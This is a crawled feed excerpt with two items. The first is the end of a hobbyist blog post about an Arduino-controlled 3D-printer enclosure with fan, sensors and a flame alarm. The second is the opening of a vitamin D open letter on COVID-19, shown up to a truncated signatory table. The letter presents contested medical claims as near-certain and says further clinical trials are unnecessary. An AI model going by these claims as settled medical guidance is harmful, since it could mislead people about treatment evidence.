    <img data-src="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/lexan1.jpg" alt="" data-srcset="    /assets/resized/lexan1-480x360.jpg 480w,    /assets/resized/lexan1-960x720.jpg 960w,    /assets/resized/lexan1-1200x900.jpg 1200w,/assets/images/posts/3d-printer-filtration/lexan1.jpg 2000w" src="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/lexan1.jpg" srcset="    https://mikebuss.com/assets/resized/lexan1-480x360.jpg 480w,    https://mikebuss.com/assets/resized/lexan1-960x720.jpg 960w,    https://mikebuss.com/assets/resized/lexan1-1200x900.jpg 1200w,https://mikebuss.com/assets/images/posts/3d-printer-filtration/lexan1.jpg 2000w">
</picture>
</a>


<figcaption>I used Lexan because it was readily available at the local Home Depot.</figcaption>

</figure>

<p>After cutting the Lexan, I connected all the pieces with 3D-printed parts. Special thanks to <a href="https://www.thingiverse.com/core2/designs">Hans Peter</a> for building something similar and releasing the <a href="https://www.thingiverse.com/thing:3357829">designs</a> on Thingiverse.</p>

<figure>

    <a href="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/enclosure-connectors-1.jpg">

<picture>
    
    <source data-srcset="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/enclosure-connectors-1.webp" type="image/webp">
    
    <img data-src="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/enclosure-connectors-1.jpg" alt="" data-srcset="    /assets/resized/enclosure-connectors-1-480x640.jpg 480w,    /assets/resized/enclosure-connectors-1-960x1280.jpg 960w,    /assets/resized/enclosure-connectors-1-1200x1600.jpg 1200w,/assets/images/posts/3d-printer-filtration/enclosure-connectors-1.jpg 2000w" src="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/enclosure-connectors-1.jpg" srcset="    https://mikebuss.com/assets/resized/enclosure-connectors-1-480x640.jpg 480w,    https://mikebuss.com/assets/resized/enclosure-connectors-1-960x1280.jpg 960w,    https://mikebuss.com/assets/resized/enclosure-connectors-1-1200x1600.jpg 1200w,https://mikebuss.com/assets/images/posts/3d-printer-filtration/enclosure-connectors-1.jpg 2000w">
</picture>
</a>


<figcaption>The connecting parts were 3D printed.</figcaption>

</figure>

<figure>

    <a href="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/empty-enclosure1.jpg">

<picture>
    
    <source data-srcset="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/empty-enclosure1.webp" type="image/webp">
    
    <img data-src="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/empty-enclosure1.jpg" alt="" data-srcset="    /assets/resized/empty-enclosure1-480x360.jpg 480w,    /assets/resized/empty-enclosure1-960x720.jpg 960w,    /assets/resized/empty-enclosure1-1200x900.jpg 1200w,/assets/images/posts/3d-printer-filtration/empty-enclosure1.jpg 2000w" src="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/empty-enclosure1.jpg" srcset="    https://mikebuss.com/assets/resized/empty-enclosure1-480x360.jpg 480w,    https://mikebuss.com/assets/resized/empty-enclosure1-960x720.jpg 960w,    https://mikebuss.com/assets/resized/empty-enclosure1-1200x900.jpg 1200w,https://mikebuss.com/assets/images/posts/3d-printer-filtration/empty-enclosure1.jpg 2000w">
</picture>
</a>


<figcaption>The final Lexan enclosure.</figcaption>

</figure>

<p>Now that I had the shell, it was time for the guts: the electronics.</p>

<hr>

<h2 id="wiring-everything-up">Wiring Everything Up</h2>

<p>The first rule of wiring electronics is don’t accidentally put 12V into a pin that expects 5V. You’ll get lots of smoke and heat and generally feel bad. After you’ve learned that rule, continue reading.</p>

<figure>

    <a href="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/electronics.png">

<picture>
    
    <source data-srcset="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/electronics.webp" type="image/webp">
    
    <img data-src="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/electronics.png" alt="" data-srcset="    /assets/resized/electronics-480x240.png 480w,    /assets/resized/electronics-960x480.png 960w,    /assets/resized/electronics-1200x600.png 1200w,/assets/images/posts/3d-printer-filtration/electronics.png 2000w" src="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/electronics.png" srcset="    https://mikebuss.com/assets/resized/electronics-480x240.png 480w,    https://mikebuss.com/assets/resized/electronics-960x480.png 960w,    https://mikebuss.com/assets/resized/electronics-1200x600.png 1200w,https://mikebuss.com/assets/images/posts/3d-printer-filtration/electronics.png 2000w">
</picture>
</a>


<figcaption>No electronics project would be complete without a prototype that looks like a rat's nest (top right). I cleaned this up later!</figcaption>

</figure>

<p>I managed to assemble a gaggle of electronics that all needed power. Some needed 12V to work. Others needed 3.3V. Some were controlled with <a href="https://en.wikipedia.org/wiki/Pulse-width_modulation">pulse width modulation</a>, others with <a href="https://en.wikipedia.org/wiki/I%C2%B2C">I2C</a>. Getting them powered and conducting a symphony of functions was, in my opinion, the best part of this project.</p>

<p>I started with a 12V 3A <a href="https://www.amazon.com/gp/product/B07HNV6SBJ/ref=ppx_yo_dt_b_search_asin_title?ie=UTF8&amp;psc=1">power supply</a>. This, wired into my <a href="https://store.arduino.cc/usa/nano-33-iot">Arduino Nano 33 IoT</a>, a <a href="https://www.amazon.com/gp/product/B01M0E6SQM/ref=ppx_yo_dt_b_search_asin_title?ie=UTF8&amp;psc=1">relay</a>, and (via the relay) the fan, gave life to the essential components. I could now turn the fan on and off through the Arduino, but only at full speed.</p>

<figure>

    <a href="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/fan-relay.png">

<picture>
    
    <source data-srcset="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/fan-relay.webp" type="image/webp">
    
    <img data-src="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/fan-relay.png" alt="" data-srcset="    /assets/resized/fan-relay-480x240.png 480w,    /assets/resized/fan-relay-960x480.png 960w,    /assets/resized/fan-relay-1200x600.png 1200w,/assets/images/posts/3d-printer-filtration/fan-relay.png 2000w" src="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/fan-relay.png" srcset="    https://mikebuss.com/assets/resized/fan-relay-480x240.png 480w,    https://mikebuss.com/assets/resized/fan-relay-960x480.png 960w,    https://mikebuss.com/assets/resized/fan-relay-1200x600.png 1200w,https://mikebuss.com/assets/images/posts/3d-printer-filtration/fan-relay.png 2000w">
</picture>
</a>


<figcaption>Without the relay (bottom right), the fan could only be slowed down, not stopped completely.</figcaption>

</figure>

<p>To control the fan’s speed, I connected its PWM pin to a PWM pin on the Arduino. It took some math to change the Arduino’s built-in PWM frequency to 25 kHz, but the slower fan speed significantly reduced noise.</p>

<p>Now that the Arduino could control the fan, I wanted to have it start and stop automatically. To do this, I used the built-in WiFi module poll the <a href="https://support.ultimaker.com/hc/en-us/articles/360012087619-Using-the-Ultimaker-APIs">Ultimaker S3’s API</a> periodically.</p>

<figure>

    <a href="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/api2.jpeg">

<picture>
    
    <source data-srcset="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/api2.webp" type="image/webp">
    
    <img data-src="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/api2.jpeg" alt="" data-srcset="    /assets/resized/api2-480x360.jpeg 480w,    /assets/resized/api2-960x720.jpeg 960w,    /assets/resized/api2-1200x900.jpeg 1200w,/assets/images/posts/3d-printer-filtration/api2.jpeg 2000w" src="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/api2.jpeg" srcset="    https://mikebuss.com/assets/resized/api2-480x360.jpeg 480w,    https://mikebuss.com/assets/resized/api2-960x720.jpeg 960w,    https://mikebuss.com/assets/resized/api2-1200x900.jpeg 1200w,https://mikebuss.com/assets/images/posts/3d-printer-filtration/api2.jpeg 2000w">
</picture>
</a>


<figcaption>The Ultimaker S3 comes with an excellent API.</figcaption>

</figure>

<p>Then, because everyone loves data, I added some logging to my creation. I equipped the inside and outside of the chamber with sensors that measure temperature, humidity, and VOC levels. This data is sent over WiFi to a server running on my <a href="https://en.wikipedia.org/wiki/Network-attached_storage">NAS</a> (a <a href="https://www.amazon.com/Synology-bay-DiskStation-DS918-Diskless/dp/B075N1Z9LT">Synology DS918+</a>). Eventually, I’d like to use this data in real-time to control the fan speed, but for now, it’s just filed away along with information on what was printed and when.</p>

<figure>

    <a href="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/sensors1.jpg">

<picture>
    
    <source data-srcset="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/sensors1.webp" type="image/webp">
    
    <img data-src="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/sensors1.jpg" alt="" data-srcset="    /assets/resized/sensors1-480x360.jpg 480w,    /assets/resized/sensors1-960x720.jpg 960w,    /assets/resized/sensors1-1200x900.jpg 1200w,/assets/images/posts/3d-printer-filtration/sensors1.jpg 2000w" src="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/sensors1.jpg" srcset="    https://mikebuss.com/assets/resized/sensors1-480x360.jpg 480w,    https://mikebuss.com/assets/resized/sensors1-960x720.jpg 960w,    https://mikebuss.com/assets/resized/sensors1-1200x900.jpg 1200w,https://mikebuss.com/assets/images/posts/3d-printer-filtration/sensors1.jpg 2000w">
</picture>
</a>


<figcaption>The temperature and humidity (left) and air quality (right) sensors.</figcaption>

</figure>

<p>Adding two temperature sensors was a little tricky, considering they share the same hardcoded I2C address. Because of this, the Arduino can’t address them individually. My solution was to use an <a href="https://learn.adafruit.com/adafruit-tca9548a-1-to-8-i2c-multiplexer-breakout/overview">I2C multiplexer</a> to let me switch between sensors and query them individually.</p>

<p>While all of this is happening, the Arduino is also checking a flame sensor that hovers over the printer. If this sensor detects a fire, the power to the Ultimaker is immediately shut off, and a piezo alarm starts blaring. It’s not as cool as those <a href="https://shop3duniverse.com/products/3d-print-clean-automatic-fire-suppression-add-on">automatic fire suppression</a> kits you can buy, but the alarm can be heard throughout the house.</p>

<figure>

    <a href="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/breadboard.jpeg">

<picture>
    
    <source data-srcset="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/breadboard.webp" type="image/webp">
    
    <img data-src="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/breadboard.jpeg" alt="" data-srcset="    /assets/resized/breadboard-480x360.jpeg 480w,    /assets/resized/breadboard-960x720.jpeg 960w,    /assets/resized/breadboard-1200x900.jpeg 1200w,/assets/images/posts/3d-printer-filtration/breadboard.jpeg 2000w" src="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/breadboard.jpeg" srcset="    https://mikebuss.com/assets/resized/breadboard-480x360.jpeg 480w,    https://mikebuss.com/assets/resized/breadboard-960x720.jpeg 960w,    https://mikebuss.com/assets/resized/breadboard-1200x900.jpeg 1200w,https://mikebuss.com/assets/images/posts/3d-printer-filtration/breadboard.jpeg 2000w">
</picture>
</a>


<figcaption>The flame sensor (left) will report if it detects a fire in the print chamber. This photo was taken when I was still breadboarding the prototype.</figcaption>

</figure>

<hr>

<figure>

    <a href="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/enclosure2.jpg">

<picture>
    
    <source data-srcset="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/enclosure2.webp" type="image/webp">
    
    <img data-src="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/enclosure2.jpg" alt="" data-srcset="    /assets/resized/enclosure2-480x306.jpg 480w,    /assets/resized/enclosure2-960x612.jpg 960w,    /assets/resized/enclosure2-1200x765.jpg 1200w,/assets/images/posts/3d-printer-filtration/enclosure2.jpg 1976w" src="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/enclosure2.jpg" srcset="    https://mikebuss.com/assets/resized/enclosure2-480x306.jpg 480w,    https://mikebuss.com/assets/resized/enclosure2-960x612.jpg 960w,    https://mikebuss.com/assets/resized/enclosure2-1200x765.jpg 1200w,https://mikebuss.com/assets/images/posts/3d-printer-filtration/enclosure2.jpg 1976w">
</picture>
</a>


</figure>

<figure>

    <a href="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/dark.jpg">

<picture>
    
    <source data-srcset="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/dark.webp" type="image/webp">
    
    <img data-src="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/dark.jpg" alt="" data-srcset="    /assets/resized/dark-480x315.jpg 480w,    /assets/resized/dark-960x630.jpg 960w,    /assets/resized/dark-1200x788.jpg 1200w,/assets/images/posts/3d-printer-filtration/dark.jpg 1962w" src="https://d1dtl6c2x4cczo.cloudfront.net/assets/images/posts/3d-printer-filtration/dark.jpg" srcset="    https://mikebuss.com/assets/resized/dark-480x315.jpg 480w,    https://mikebuss.com/assets/resized/dark-960x630.jpg 960w,    https://mikebuss.com/assets/resized/dark-1200x788.jpg 1200w,https://mikebuss.com/assets/images/posts/3d-printer-filtration/dark.jpg 1962w">
</picture>
</a>


</figure>

<p>You can find the parts I used <a href="https://mikebuss.com/assets/downloads/Smart_Enclosure_Hardware_Components.pdf">here</a>.</p>

<p>All said and done, this project was fun to build and gives my wife and me some peace of mind. If you’ve created something similar, I would love to <a href="mailto:mike@mikebuss.com">hear about it</a>!</p>

<hr>

<p><small><a name="risks-footnote"></a>1. OK, OK, a 3D printer probably won’t kill you. But, research suggests there are health concerns with the particles emitted by the heating element.</small></p>


  <hr>

  <div>
    
      
      <p><a href="https://mikebuss.com/2020/10/08/welcome-theodore/">Welcoming Our First</a></p>
      <p>Today, my wife and I welcomed Theodore Frederick Buss into the world!</p>
    
    
    
      <p>No newer posts.</p>
    
  </div>

  <hr>

  <div>
    <div>
      
      <p><a href="https://mikebuss.com/about">Mike Buss</a> is a software engineer from Ohio who works primarily in the healthcare space. His <a href="https://mikebuss.com/work">work</a> has been <a href="https://mikebuss.com/2014/03/24/featured-apple/">featured</a> on Apple.com and helped hundreds of thousands of patients. In his spare time, he writes about software development and <a href="https://mikebuss.com/writing/">more</a>.</p>
      
      <p>Follow <a href="https://twitter.com/michaeltbuss">@michaeltbuss</a> on Twitter as he continues to document his software development journey.</p>
    </div>
  </div>

</div></div>]]>
            </description>
            <link>https://mikebuss.com/2021/01/06/3d-printer-filtration/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25680448</guid>
            <pubDate>Fri, 08 Jan 2021 01:55:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Over 100 Scientists and Doctors Call for Increased Vitamin D to Combat Covid-19]]>
            </title>
            <description>
<![CDATA[
Score 119 | Comments 107 (<a href="https://news.ycombinator.com/item?id=25680282">thread link</a>) | @kpfleger
<br/>
January 7, 2021 | https://vitamindforall.org/letter.html | <a href="https://web.archive.org/web/*/https://vitamindforall.org/letter.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><span>#VitaminDforAll </span><span>(for questions or fact checking assistance, contact press@vitaminDforAll.org)</span></p><p id="h.mjz6soj7f435"><span>Over 100 </span><span>Scientists, Doctors, &amp; Leading Authorities</span><span>&nbsp;Call For </span><span>Increased</span><span>&nbsp;Vitamin D Use To Combat COVID-19</span></p><p><span>[Residents of the USA: Text “VitaminDforAll” to 50409 to send this to your state’s governor.]</span></p><p><span>Research shows low vitamin D levels almost certainly promote COVID-19 infections, hospitalizations, and deaths. Given its safety, </span><span>w</span><span>e call for immediate widespread increased vitamin D intakes</span><span>.</span></p><p><span>Vitamin D modulates thousands of genes and many aspects of immune function, both innate and adaptive. The scientific evidence</span><span>1</span><span>&nbsp;shows that:</span></p><p><span>Vitamin D is well known to be essential, but most people do not get enough. Two common definitions of inadequacy are deficiency &lt; 20ng/ml (50nmol/L), the target of most governmental organizations, and insufficiency &lt; 30ng/ml (75nmol/L), the target of several medical societies &amp; experts.</span><span>2</span><span>&nbsp;Too many people have levels below these targets. </span><span>Rates of vitamin D deficiency &lt;20ng/ml exceed 33% of the population in most of the world, and most estimates of insufficiency &lt;30ng/ml are well over 50% (but much higher in many countries).</span><span>3</span><span>&nbsp;Rates are even higher in winter, and several groups have notably worse deficiency: the overweight, those with dark skin (especially far from the equator), and care home residents. These same groups face increased COVID-19 risk.</span></p><p><span>It has been shown that 3875 IU (97mcg) daily is required for 97.5% of people to reach 20ng/ml, and 6200 IU (155mcg) for 30ng/ml,</span><span>4</span><span>&nbsp;intakes far above all national guidelines. Unfortunately, the report that set the US RDA included an admitted statistical error in which required intake was calculated to be ~10x too low.</span><span>4</span><span>&nbsp;Numerous calls in the academic literature to raise official recommended intakes had not yet resulted in increases by the time SARS-CoV-2 arrived. Now, many papers indicate that vitamin D affects COVID-19 more strongly than most other health conditions, with increased risk at levels &lt; 30ng/ml (75nmol/L) and severely greater risk &lt; 20ng/ml (50nmol/L).</span><span>1</span></p><p><span>Evidence to date </span><span>suggests </span><span>the possibility that the COVID-19 pandemic sustains itself in large part &nbsp;through infection of those with low vitamin D, and that deaths are concentrated largely in those with deficiency. The mere possibility that this is so should compel urgent gathering of more vitamin D data. </span><span>Even without more data</span><span>, </span><span>the </span><span>preponderance </span><span>of evidence indicates that </span><span>increased vitamin D would help reduce infections, hospitalizations, ICU admissions, &amp; deaths</span><span>.</span></p><p><span>Decades of safety data show that vitamin D has very low risk: </span><span>Toxicity would be extremely rare with the recommendations here. The risk of insufficient levels far outweighs any risk from levels that seem to provide most of the protection against COVID-19, and this is notably different from drugs. Vitamin D is much safer than steroids, such as dexamethasone, the most widely accepted treatment to have also demonstrated a large COVID-19 benefit. Vitamin D’s safety is more like that of face masks. </span><span>There is no need to wait for further clinical trials to increase use of something so safe, </span><span>especially when remedying high rates of deficiency/insufficiency should already be a priority</span><span>.</span></p><p><span>Therefore, we call on all governments, doctors, and healthcare workers worldwide to immediately recommend and implement efforts appropriate to their adult populations to increase vitamin D, at least until the end of the pandemic. Specifically to:</span></p><p><span>Many factors are known to predispose individuals to higher risk from exposure to SARS-CoV-2, such as age, being male, comorbidities, etc., but </span><span>inadequate</span><span>&nbsp;v</span><span>itamin D is by far the most easily and quickly </span><span>modifiable</span><span>&nbsp;risk factor with abundant evidence to support a large effect</span><span>. Vitamin D is inexpensive and has negligible risk compared to the considerable risk of COVID-19.</span></p><p><span>5</span><span>&nbsp;The following include 4000 IU within their tolerable intakes in official guidelines: NAM (US, Canada), SACN (UK), EFSA (Europe), Endocrine Society (international), Nordic countries, The Netherlands, Australia &amp; New Zealand, UAE, and the American Geriatrics Soc. (USA, elderly). No major agency specifies a lower tolerable intake limit. The US NAM said 4000 IU “is likely to pose no risk of adverse health effects to almost all individuals.” See also [</span><span><a href="https://pubmed.ncbi.nlm.nih.gov/32180081/">Giustina et al ‘20</a></span><span>].</span></p><p><span>The signatories below endorse this letter. Affiliations do not imply endorsement of the letter by the institutions themselves.</span></p><p><span>This letter takes no position on other public health measures besides vitamin D. Personal views of individual signatories on any other matter do not represent the group as a whole.</span></p><p><span>All signatories declare no conflicts of interest except as noted.</span></p><p><span>To emphasize: </span><span>The organizing signatories have no conflicts of interest in this area (financial or otherwise)</span><span>, nor have they done research in this area prior to 2020.</span></p><div><tbody><tr><td colspan="1" rowspan="1"><p><span>Signatories (185)</span></p></td><td colspan="1" rowspan="1"><p><span>recom- mended intake</span></p></td><td colspan="1" rowspan="1"><p><span>personal daily intake</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Karl Pfleger</span><span>, PhD AI &amp; Computer Science, Stanford. Former Google Data Scientist. Biotechnology Investor, AgingBiotech.info, San Francisco, CA, USA. (organizing signatory)</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>7000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Gareth Davies</span><span>, PhD Medical Physics, Imperial College, London, UK. Codex World’s Top 50 Innovator 2019. Independent Researcher. Lead author of “</span><span><a href="https://www.medrxiv.org/content/10.1101/2020.05.01.20087965v3">Evidence Supports a Causal Role for Vitamin D Status in COVID-19 Outcomes</a></span><span>.” (organizing signatory)</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>10,000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Bruce W Hollis</span><span>, PhD. Professor of Pediatrics, Medical University of South Carolina, USA.</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>6000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Barbara J Boucher</span><span>, MD, FRCP (London). </span><span>Honorary Professor (Medicine), Blizard Institute, Bart's &amp; The London School of Medicine and Dentistry, Queen Mary University of London, UK. </span><span>(significantly contributing signatory)</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>2000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Ashley Grossman</span><span>, MD FRCP FMedSci. Emeritus Professor of Endocrinology, University of Oxford, UK. Professor of Neuroendocrinology, Barts and the London School of Medicine. 2020 Endocrine Society Laureate Award.</span></p></td><td colspan="1" rowspan="1"><p><span>2000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>2200 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Gerry Schwalfenberg</span><span>, MD, CCFP, FCFP. Assistant Clinical Professor in Family Medicine, University of Alberta, Canada.</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>5000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Giovanna Muscogiuri</span><span>, MD PhD. Associate Editor, European Journal of Clinical Nutrition. </span><span>Department of Clinical Medicine and Surgery, Section of Endocrinology, University "Federico II" of Naples, Naples, Italy.</span><span>.</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>1000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Michael F. Holick</span><span>, PhD MD. Professor Medicine, Physiology and Biophysics and Molecular Medicine, Director Vitamin D, Skin and Bone Research Laboratory, Boston University Medical Center, USA. (6000 IU) </span><span>Disclosure: Consultant Biogena and speaker's Bureau Abbott Inc.</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>6000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. John Umhau</span><span>, MD, MPH. CDR, USPHS (ret). </span><span>President, Academy of Medicine of Washington, DC, USA. Ex-NIH: c</span><span>o-author of the first peer-reviewed report linking vitamin D deficiency with acute respiratory infection.</span><span>&nbsp;</span><span>(significantly contributing signatory)</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>5000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. </span><span>Pawel</span><span>&nbsp;</span><span>Pludowski</span><span>, MD, dr hab. Associate Professor, Biochemistry, Radioimmunology and Experimental Medicine, Children’s Memorial Health Institute, Warsaw, Poland. Chair, European Vitamin D Association (EVIDAS) [non-profit].</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>2000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Cedric F. Garland</span><span>, DrPH. Professor Emeritus, Department of Family Medicine and Public Health, University of California, San Diego, USA.</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>6000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Jose M. Benlloch</span><span>, Professor, Director of the Institute for Instrumentation on Molecular Imaging, CSIC-UPV, Valencia, Spain.</span></p></td><td colspan="1" rowspan="1"><p><span>2000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>3000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Samantha Kimball</span><span>, PhD, MLT. Professor, St. Mary's University, Calgary, Alberta, Canada. Research Director, GrassrootsHealth Nutrient Research Institute [non-profit].</span><span>&nbsp;</span><span>(significantly contributing signatory)</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>6000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. William B. Grant</span><span>, PhD Physics, U. of California, Berkeley. Director at Sunlight, Nutrition, and Health Research Center [non-profit], San Francisco, CA, USA. </span><span>Disclosure: Receives funding from Bio-Tech Pharmacal, Inc.</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>5300 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Carol L. Wagner,</span><span>&nbsp;MD. Professor, Medical University of South Carolina, USA.</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>5000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Paul Marik</span><span>, MD, FCCP, FCCM. </span><span>Chief of Pulmonary and Critical Care Medicine and Professor of Medicine</span><span>, Eastern Virginia Medical School, Norfolk, VA, USA.</span></p></td><td colspan="1" rowspan="1"><p><span>2000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>2000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Morry Silberstein</span><span>, MD. Associate Professor, Curtin University, Australia.</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Vatsal Thakkar</span><span>, MD. Founder, Reimbursify, NY, USA. &nbsp;Former faculty, NYU and Vanderbilt. &nbsp;Op-Ed writer on Vitamin D and COVID-19.</span><span>&nbsp;</span><span>(significantly contributing signatory)</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>10,000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Peter H Cobbold</span><span>, PhD. Emeritus Professor, Cell Biology, University of Liverpool, UK.</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Afrozul Haq</span><span>, PhD. Professor Dept of Food Technology, Jamia Hamdard University, New Delhi, India.</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>2000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Barry H. Thompson</span><span>, MD, FAAP, FACMG. Clinical Associate Professor (Pediatrics), Uniformed Services University of the Health Sciences, Bethesda, MD, USA.</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>5000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Reinhold Vieth</span><span>, PhD, FCACB. Professor, Departments of Nutritional Sciences and Laboratory Medicine &amp; Pathobiology, University of Toronto, Canada. Director (retired), Bone and Mineral Group Laboratory, Mt Sinai Hospital. </span><span>Disclosure: </span><span>Receives patent royalties from Ddrops (an infant vitamin D supplement).</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Linda Benskin</span><span>, PhD, RN, SRN(Ghana), CWCN, CWS, DAPWCA. Independent Researcher for Tropical Developing Countries and Ferris Mfg. Corp, Texas, USA. </span><span>(significantly contributing signatory)</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Jim O’Neill</span><span>, CEO, SENS Research Foundation. Former principal associate deputy secretary of Health and Human Services, USA.</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>6000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Eric Feigl-Ding</span><span>, PhD. Epidemiologist &amp; Health Economist. Senior Fellow, Federation of American Scientists. USA.</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>5000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Rt Hon David Davis MP</span><span>, Member of Parliament (Conservative Party). BSc, Joint Hons Molecular Science / Computer Science, Warwick University, UK.</span></p></td><td colspan="1" rowspan="1"><p><span>4000 IU</span></p></td><td colspan="1" rowspan="1"><p><span>6000 IU</span></p></td></tr><tr><td colspan="1" rowspan="1"><p><span>Dr. Rupa Huq MP,</span><span>&nbsp;Member of Parliament (Labour Party). PhD, Cultural Studies, University of East London, UK.</span></p></td><td colspan="1" 